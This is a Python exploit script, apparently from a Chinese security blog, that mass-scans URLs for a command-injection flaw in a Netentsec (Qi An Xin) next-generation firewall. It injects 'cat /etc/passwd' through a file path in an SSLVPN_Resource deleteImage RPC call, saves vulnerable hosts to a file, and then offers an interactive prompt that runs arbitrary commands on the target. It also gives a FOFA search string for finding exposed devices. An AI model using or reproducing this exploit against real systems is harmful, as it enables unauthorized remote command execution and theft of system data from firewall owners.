import requests
import sys
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+\033[31m------------------------------------------\033[0m')
    print('+  \033[31m使用方式：建立url.txt 保存需要检测的链接                                   \033[0m')
    print('+  \033[31m默认输出有漏洞的链接到文本                                                \033[0m')
    print('+  \033[31m公众号: 深夜笔记本                                                      \033[0m')
    print('+  \033[31m名称：  批量奇安信网康下一代防火墙                                           \033[0m')
    print('+  \033[31mfofa大法：  app="网康科技-下一代防火墙"                                   \033[0m')
    print('+  \033[31m执行下一个：  键如exit                                                  \033[0m')
    print('+  \033[31m想要执行全自动检测屏蔽 while True:                                       \033[0m')
    print('+\033[31m------------------------------------------\033[0m')

def POC_1(target_url):
    vuln_url = target_url + "/directdata/direct/router"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "application/json",
    }
    data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5)
        if response.status_code == 200 and "success" in response.text:
            print("\033[32m[o] 目标{}可能存在漏洞, 正在执行命令 cat /etc/passwd \033[0m".format(target_url))
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=target_url + "/test_cmd.txt", headers=headers, data=data, verify=False, timeout=5)
            if "root" in response.text and response.status_code == 200:
                print("\033[32m[o] 响应为： {} \033[0m".format(response.text))
                f = open('./vul.txt', 'a')
                f.write(vuln_url)
                f.write('\n')
                while True: #屏蔽这段可以结束交互
                    cmd = input("\033[35mCmd >>> \033[0m")
                    if cmd == "exit":
                        return
                    else:
                        POC_2(target_url, cmd)  #屏蔽这段可以结束交互
        else:
            print("\033[31m[x] 目标不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/directdata/direct/router"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "application/json",
    }
    data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;%s >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}' % (cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=target_url + "/test_cmd.txt", headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 响应为： \n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
